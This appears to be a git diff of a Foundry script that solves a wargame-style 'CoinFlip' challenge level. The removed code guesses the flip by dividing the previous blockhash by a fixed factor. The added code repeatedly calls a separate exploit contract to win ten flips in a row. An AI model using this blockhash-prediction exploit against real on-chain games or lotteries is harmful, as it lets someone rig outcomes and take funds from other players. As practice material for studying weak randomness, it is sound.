@@ -1,36 +1,28 @@
-// SPDX-License-Identifier: UNLICENSED
+// SPDX-License-Identifier: CC-BY-4.0
 pragma solidity ^0.8.13;
 
 import "forge-std/Script.sol";
-import "src/03/CoinFlip.sol";
+import {CoinFlip} from "src/03/CoinFlip.sol";
+import {CoinFlipExploit} from "src/03/CoinFlipExploit.sol";
 
 
 contract Exploit is Script {
 
-    address levelInstance = 0x99e32C45080034F63e10Bb03697458b58CDFFceE;
+    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    address levelInstance = 0xfC3A1c7Aaf80dAf711256cEa4d959722DbF2B5B1;
     CoinFlip level = CoinFlip(levelInstance);
-    
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
-    function generateSide() internal view returns (bool) {
-
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlip == 1 ? true : false;
-        return side;
-
-     }
-
-    function run() external {
+    CoinFlipExploit exploit = new CoinFlipExploit(level);
+ 
+    function run() public {
 
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        
-        bool nextSide = generateSide();
-        console.log(nextSide, "side");
-        require(level.flip(nextSide), "Guess failed");
 
-       
-        console.log(level.consecutiveWins());
+        uint256 count = 0;
+        do {
+            exploit.run();
+            ++count;
+        } while (count < 10);
 
         vm.stopBroadcast();
     }
